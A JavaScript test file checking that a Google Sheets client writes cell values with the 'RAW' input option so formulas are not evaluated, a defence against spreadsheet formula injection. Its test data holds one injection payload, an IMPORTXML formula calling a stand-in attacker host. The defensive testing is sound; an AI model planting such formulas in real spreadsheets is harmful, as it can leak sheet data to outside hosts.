import test from 'node:test';
import assert from 'node:assert/strict';

import { SheetsClient } from '../src/services/sheets-client.js';

test('writes app and human values as RAW cells to prevent formula injection', async () => {
  const calls = [];
  const api = { request: async (url, options) => { calls.push({ url, options }); return {}; } };
  const client = new SheetsClient(api);
  await client.batchUpdateValues('sheet', [{ range: "'Items'!A2", values: [["=IMPORTXML(\"https://attacker.example\")"]] }]);
  await client.appendValues('sheet', "'Items'!A:Z", [["=1+1"]]);
  assert.equal(calls[0].options.body.valueInputOption, 'RAW');
  assert.equal(calls[1].options.query.valueInputOption, 'RAW');
  assert.equal(calls[0].options.body.data[0].values[0][0], '=IMPORTXML("https://attacker.example")');
});
